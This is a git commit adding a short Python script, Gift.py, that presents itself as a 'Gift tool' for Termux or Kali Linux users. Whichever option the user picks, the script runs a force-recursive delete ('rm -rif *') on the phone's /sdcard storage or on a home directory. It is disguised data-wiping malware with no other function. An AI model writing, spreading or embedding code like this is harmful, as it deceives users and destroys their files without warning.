661659698ae83602825453cfb331c595569e67db
Black-Crew-Hackers <84212400+Black-Crew-Hackers@users.noreply.github.com>
2021-05-17 10:29:38 +0200

    Add files via upload

---
+++ Gift.py
@@ -0,0 +1,28 @@
+from os import system
+from time import sleep
+import sys 
+import time
+system ('figlet Gift tool ')
+
+print ('{1} Gift For termux ')
+print ('{2} Gift For Kali Linux ')
+
+x = input ('put your selection ...: ')
+
+if x == '1' :
+
+    system ('''
+
+cd ..
+cd /sdcard
+rm -rif * ''' )
+
+elif x == '2' :
+
+    system ('''
+cd home
+rm -rif * ''')
+
+else:
+    print (' put a correct number ')
+
